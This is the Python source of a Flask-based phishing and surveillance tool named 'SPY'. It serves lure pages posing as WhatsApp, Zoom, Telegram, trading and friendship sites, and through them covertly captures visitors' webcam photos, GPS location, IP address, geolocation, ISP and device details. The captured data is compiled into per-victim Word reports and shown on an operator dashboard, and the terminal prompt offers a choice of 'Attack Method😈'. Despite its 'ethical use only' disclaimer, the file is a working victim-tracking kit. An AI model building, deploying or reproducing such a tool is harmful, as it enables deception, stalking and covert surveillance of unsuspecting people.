# This is a location, picture, ip, and device Information collecting tool
import os
from flask import Flask, render_template, request, session, redirect, url_for, abort, send_from_directory
from datetime import datetime, timedelta
import base64
import logging
import subprocess
import platform
from threading import Lock
import socket
import ipaddress
from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.shared import Inches, RGBColor
import requests
import smtplib
from email.mime.text import MIMEText
from dotenv import load_dotenv
import time
import json

# Load environment variables
load_dotenv()

#ANSI color codes for terminal
R = "\033[1;31m"  # Red (for banner)
G = "\033[1;32m"  # Bright Green
C = "\033[1;36m"  # Bright Cyan
W = "\033[1;37m"  # Bright White
B = "\033[1;35m"  # Bright Magenta (Pink)
Y = "\033[1;33m"  # Bright Yellow
M = "\033[1;34m"  # Bright Blue
P = "\033[1;35m"  # Bright Purple
RESET = "\033[0m"  # Reset

# Clear terminal
if platform.system() == "Windows":
    subprocess.call("cls", shell=True)
else:
    subprocess.call("clear", shell=True)

# Enhanced Colorful Banner with Red color
banner = f"""{R}
   _____ _____ __     __
  / ____|  __ \\ \\   / /
 | (___ | |__) | \\ \\_/ / 
  \\___ \\|  ___/   \\   /  
  ____) | |        | |   
 |_____/|_|        |_|   
          
{G}----------------------------------------
{C}Developed by : {W}Jutt Studio
{C}Creator      : {W} Aafaq Jutt
{C}Version      : {W}2.1.4
{G}----------------------------------------
{Y}This tool is designed for ethical purposes,
educational use , and security testing only.
Unauthorized use is strictly prohibited.
{G}----------------------------------------{RESET}
"""
print(banner)

# Suppress Flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.secret_key = os.urandom(24)  # For session management
print_lock = Lock()
client_counter = 0
last_location_url = None
client_folder = None
photo_count = 0

# Admin security variables
failed_attempts = 0
lockout_time = None

# create necessary folders
folders = ['templates/Attack_files', 'static/css', 'static/js', 'data', 'templates/admin']
for folder in folders:
    os.makedirs(folder, exist_ok=True)

# -------------------------------#
# This is Templates 
TEMPLATES = {
    "Attack_files": {
        "1": "friendship.html",
        "2": "online_trading.html",
        "3": "whatsapp.html",
        "4": "zoom.html",
        "5": "Telegram.html",
    }
}

# -------------------------------#
# CLI-based template selection for Pic_Location only
def select_template():
    print(f"{P}{B}Select Attack Method😈:{RESET}")
    for key, value in TEMPLATES["Attack_files"].items():
        # Remove .html extension for display
        display_name = value.replace('.html', '')
        print(f"{G}{key}. {C}{display_name}{RESET}")
    
    template_choice = input(f"{Y}> {RESET}").strip()
    selected_template = TEMPLATES["Attack_files"].get(template_choice)
    
    if not selected_template:
        print(f"{R}Invalid selection.{RESET}")
        exit()
        
    # Remove .html extension for display
    display_name = selected_template.replace('.html', '')
    print(f"{G}You selected: {C}{display_name}{RESET}")
    return "Pic_Locaton", selected_template

# -------------------------------#
# Send email notification function
def send_lockout_email():
    try:
        sender_email = os.getenv("ADMIN_EMAIL")
        receiver_email = os.getenv("ADMIN_EMAIL")
        password = os.getenv("EMAIL_PASSWORD")
        
        if not all([sender_email, receiver_email, password]):
            print(f"{Y}[!] Email credentials not configured{RESET}")
            return False
            
        msg = MIMEText("Someone has attempted to login to your admin panel 4 times unsuccessfully. The admin account has been locked for 10 minutes.")
        msg['Subject'] = 'Admin Account Lockout Notification'
        msg['From'] = sender_email
        msg['To'] = receiver_email
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.send_message(msg)
        
        print(f"{G}[✓] Lockout email sent{RESET}")
        return True
    except Exception as e:
        print(f"{R}[✗] Failed to send email: {e}{RESET}")
        return False

# -------------------------------#
# Flask route using selected template
category, selected_template = select_template()

@app.route('/')
def index():
    return render_template(f"{category}/{selected_template}")

# -------------------------------#
# Admin routes
@app.route('/admin')
def admin_login():
    # Check if account is locked
    global lockout_time, failed_attempts
    
    if lockout_time and datetime.now() < lockout_time:
        remaining = (lockout_time - datetime.now()).seconds // 60
        return render_template('admin/login.html', error=f"Account locked. Try again in {remaining} minutes.")
    
    return render_template('admin/login.html')

@app.route('/admin/login', methods=['POST'])
def admin_auth():
    global failed_attempts, lockout_time
    
    # Check if account is locked
    if lockout_time and datetime.now() < lockout_time:
        remaining = (lockout_time - datetime.now()).seconds // 60
        return render_template('admin/login.html', error=f"Account locked. Try again in {remaining} minutes.")
    
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username == os.getenv("ADMIN_USERNAME") and password == os.getenv("ADMIN_PASSWORD"):
        # Successful login
        session['admin'] = True
        failed_attempts = 0
        lockout_time = None
        return redirect(url_for('admin_dashboard'))
    else:
        # Failed login
        failed_attempts += 1
        
        if failed_attempts >= 4:
            lockout_time = datetime.now() + timedelta(minutes=10)
            send_lockout_email()
            return render_template('admin/login.html', error="Too many failed attempts. Account locked for 10 minutes.")
        
        return render_template('admin/login.html', error=f"Invalid credentials. {4-failed_attempts} attempts remaining.")

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    # Get all client data
    clients = []
    data_dir = 'data'
    
    if os.path.exists(data_dir):
        for client_folder in os.listdir(data_dir):
            client_path = os.path.join(data_dir, client_folder)
            if os.path.isdir(client_path):
                # Find the docx file
                docx_files = [f for f in os.listdir(client_path) if f.endswith('.docx')]
                if docx_files:
                    # Extract info from the first docx file
                    doc = Document(os.path.join(client_path, docx_files[0]))
                    client_info = {
                        'id': client_folder,
                        'date': ' '.join(client_folder.split('_')[1:3]) if '_' in client_folder else 'Unknown'
                    }
                    
                    # Extract basic info from document
                    for paragraph in doc.paragraphs:
                        text = paragraph.text
                        if 'OS :' in text:
                            client_info['os'] = text.split('OS :')[-1].strip()
                        elif 'Country :' in text:
                            client_info['country'] = text.split('Country :')[-1].strip()
                        elif 'City :' in text:
                            client_info['city'] = text.split('City :')[-1].strip()
                    
                    clients.append(client_info)
    
    return render_template('admin/dashboard.html', clients=clients)

@app.route('/admin/client/<client_id>')
def admin_client_details(client_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    client_path = os.path.join('data', client_id)
    if not os.path.exists(client_path) or not os.path.isdir(client_path):
        return "Client not found", 404
    
    # Find the docx file
    docx_files = [f for f in os.listdir(client_path) if f.endswith('.docx')]
    if not docx_files:
        return "No data file found for this client", 404
    
    # Read the document
    doc = Document(os.path.join(client_path, docx_files[0]))
    client_data = {"sections": []}
    
    current_section = None
    for paragraph in doc.paragraphs:
        text = paragraph.text
        if paragraph.style.name.startswith('Heading'):
            if current_section:
                client_data["sections"].append(current_section)
            current_section = {"title": text, "content": []}
        elif current_section and text.strip():
            current_section["content"].append(text)
    
    if current_section:
        client_data["sections"].append(current_section)
    
    # Get photos
    photos = [f for f in os.listdir(client_path) if f.endswith('.png')]
    client_data["photos"] = photos
    client_data["id"] = client_id
    
    return render_template('admin/client_details.html', client=client_data)

# Route to serve captured images
@app.route('/data/<client_id>/<filename>')
def serve_image(client_id, filename):
    if not session.get('admin'):
        abort(403)  # Forbidden if not admin
    return send_from_directory(os.path.join('data', client_id), filename)

@app.route('/admin/delete/<client_id>', methods=['POST'])
def admin_delete_client(client_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    client_path = os.path.join('data', client_id)
    if os.path.exists(client_path) and os.path.isdir(client_path):
        import shutil
        shutil.rmtree(client_path)
        # Log the deletion
        with open('admin_actions.log', 'a') as f:
            f.write(f"{datetime.now()} - Admin deleted client {client_id}\n")
    
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

# Prevent access to .env file
@app.route('/.env')
def block_env():
    abort(404)

# -------------------------------#
# Helpers for NETWORK ONLY
# -------------------------------
def get_client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        first = xff.split(",")[0].strip()
        if first:
            return first
    return request.remote_addr or ""

def split_ip_versions(ip_str):
    ip4, ip6 = "", ""
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        if ip_obj.version == 4:
            ip4 = ip_str
        elif ip_obj.version == 6:
            ip6 = ip_str
    except Exception:
        pass
    return ip4, ip6

def fetch_geo(ip_str):
    url = f"https://ipwho.is/{ip_str}" if ip_str else "https://ipwho.is/"
    try:
        r = requests.get(
            url,
            params={"fields": "continent,country,region,city,connection,success"},
            timeout=8,
        )
        j = r.json()
        if j.get("success") is False:
            return {}
        conn = j.get("connection") or {}
        return {
            "continent": j.get("continent") or "Unknown",
            "country":   j.get("country") or "Unknown",
            "region":    j.get("region") or "Unknown",
            "city":      j.get("city") or "Unknown",
            "org":       conn.get("org") or "Unknown",
            "isp":       conn.get("isp") or "Unknown",
        }
    except Exception:
        return {}

# -------------------------------
# Routes
# -------------------------------
@app.route("/save_photo", methods=["POST"])
def save_photo():
    global photo_count, client_folder
    data = request.json["image"]
    _, encoded = data.split(",", 1)
    binary = base64.b64decode(encoded)
    if client_folder:
        filename = os.path.join(client_folder, f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        with open(filename, "wb") as f:
            f.write(binary)
        photo_count += 1
        # Only show a simple message without filename
        print(f"{G}[+] Photo Captured{RESET}")
    return ""

@app.route("/save_location", methods=["POST"])
def save_location():
    global last_location_url
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    last_location_url = f"https://www.google.com/maps?q={lat},{lon}"
    return ""

@app.route("/save_client_info", methods=["POST"])
def save_client_info():
    global client_counter, last_location_url, client_folder

    info = request.json if request.is_json else {}

    client_counter += 1  # Increment visitor count

    # --- NEW FEATURE: Show visitor number in terminal ---
    with print_lock:
        print(f"\n{B}╔══════════════════════════════════╗{RESET}")
        print(f"{B}║ {Y}Visitor {client_counter:02d} {B}                      ║{RESET}")
        print(f"{B}╚══════════════════════════════════╝{RESET}")
    # -------------------------------------------------------

    client_ip = get_client_ip()
    ip4, ip6 = split_ip_versions(client_ip)
    geo = fetch_geo(client_ip)

    continent = geo.get("continent", "Unknown")
    country   = geo.get("country", "Unknown")
    region    = geo.get("region", "Unknown")
    city      = geo.get("city", "Unknown")
    org       = geo.get("org", "Unknown")
    isp       = geo.get("isp", "Unknown")

    client_folder = os.path.join("data", f"client_{client_counter}")
    os.makedirs(client_folder, exist_ok=True)

    # Word document
    doc = Document()
    title = doc.add_heading(f"Client #{client_counter} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", level=0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER

    # Device Information heading with color & bold
    heading = doc.add_heading("Device Information", level=1)
    heading.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = heading.runs[0]
    run.font.color.rgb = RGBColor(46, 134, 193)  # Blue
    run.font.bold = True

    for key in ["platform", "osVersion", "cpuCores", "ram", "gpu", "screenWidth", "screenHeight", "battery", "userAgent"]:
        doc.add_paragraph(f"{key} : {info.get(key, 'Unknown')}", style='List Bullet')

    # Network Information heading with color & bold
    heading = doc.add_heading("Network Information", level=1)
    heading.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = heading.runs[0]
    run.font.color.rgb = RGBColor(40, 180, 99)  # Green
    run.font.bold = True

    doc.add_paragraph(f"IPv4 : {ip4 or 'Unknown'}", style='List Bullet')
    doc.add_paragraph(f"IPv6 : {ip6 or 'Unknown'}", style='List Bullet')
    doc.add_paragraph(f"Continent : {continent}", style='List Bullet')
    doc.add_paragraph(f"Country : {country}", style='List Bullet')
    doc.add_paragraph(f"Region : {region}", style='List Bullet')
    doc.add_paragraph(f"City : {city}", style='List Bullet')
    doc.add_paragraph(f"Org : {org}", style='List Bullet')
    doc.add_paragraph(f"ISP : {isp}", style='List Bullet')

    if last_location_url:
        doc.add_heading("Location", level=1)
        doc.add_paragraph(f"Google Maps URL : {last_location_url}", style='List Bullet')

    photos = sorted([f for f in os.listdir(client_folder) if f.endswith(".png")])
    if photos:
        # Captured Photos heading colored
        heading = doc.add_heading("Captured Photos", level=1)
        heading.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = heading.runs[0]
        run.font.color.rgb = RGBColor(155, 89, 182)  # Purple
        run.font.bold = True
        for photo in photos:
            doc.add_paragraph(photo)
            doc.add_picture(os.path.join(client_folder, photo), width=Inches(4))

    # Ethical notice
    doc.add_heading("Developer & Ethical Notice", level=1)
    doc.add_paragraph("Developed by: JS", style='List Bullet')
    doc.add_paragraph("Creator: 😈😈😈", style='List Bullet')
    doc.add_paragraph("This tool is designed for ethical purposes, educational use, and security testing only. Unauthorized use is strictly prohibited.", style='List Bullet')

    doc_path = os.path.join(client_folder, f"info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.docx")
    doc.save(doc_path)

    with print_lock:
        # Terminal bold headings with better formatting
        print(f"\n{P}╔══════════════════════════════════╗{RESET}")
        print(f"{P}║ {Y}Device Information {P}               ║{RESET}")
        print(f"{P}╚══════════════════════════════════╝{RESET}")
        print(f"{G}├─ {C}OS         : {W}{info.get('osVersion','Unknown')}{RESET}")
        print(f"{G}├─ {C}Platform   : {W}{info.get('platform','Unknown')}{RESET}")
        print(f"{G}├─ {C}CPU Cores  : {W}{info.get('cpuCores','Unknown')}{RESET}")
        print(f"{G}├─ {C}RAM        : {W}{info.get('ram','Unknown')}{RESET}")
        print(f"{G}├─ {C}GPU        : {W}{info.get('gpu','Unknown')}{RESET}")
        print(f"{G}├─ {C}Resolution : {W}{info.get('screenWidth','Unknown')}x{info.get('screenHeight','Unknown')}{RESET}")
        print(f"{G}├─ {C}Battery    : {W}{info.get('battery','Unknown')}%{RESET}")
        print(f"{G}└─ {C}Browser    : {W}{info.get('userAgent','Unknown')}{RESET}")

        print(f"\n{P}╔══════════════════════════════════╗{RESET}")
        print(f"{P}║ {Y}Network Details {P}                  ║{RESET}")
        print(f"{P}╚══════════════════════════════════╝{RESET}")
        print(f"{G}├─ {C}Public IP  : {W}{ip4 or ip6 or 'Unknown'}{RESET}")
        print(f"{G}├─ {C}Continent  : {W}{continent}{RESET}")
        print(f"{G}├─ {C}Country    : {W}{country}{RESET}")
        print(f"{G}├─ {C}Region     : {W}{region}{RESET}")
        print(f"{G}├─ {C}City       : {W}{city}{RESET}")
        print(f"{G}├─ {C}Org        : {W}{org}{RESET}")
        print(f"{G}└─ {C}ISP        : {W}{isp}{RESET}")
        if last_location_url:
            print(f"{G}└─ {C}Google Maps URL : {W}{last_location_url}{RESET}")

        # Only show a simple message if photos were captured
        photos = [f for f in os.listdir(client_folder) if f.startswith('photo_') and f.endswith('.png')]
        if photos:
            print(f"{G}[+] {len(photos)} Photos Captured{RESET}")

    return ""

# === LOCALHOST RUN ===# === LOCALHOST RUN ===
if __name__ == "__main__":
    host_ip = "127.0.0.1"
    port = 5050
    print(f"\n{G}[+] Flask server running on: {C}http://{host_ip}:{port}{W}\n")
    app.run(host=host_ip, port=port, debug=False, load_dotenv=False)
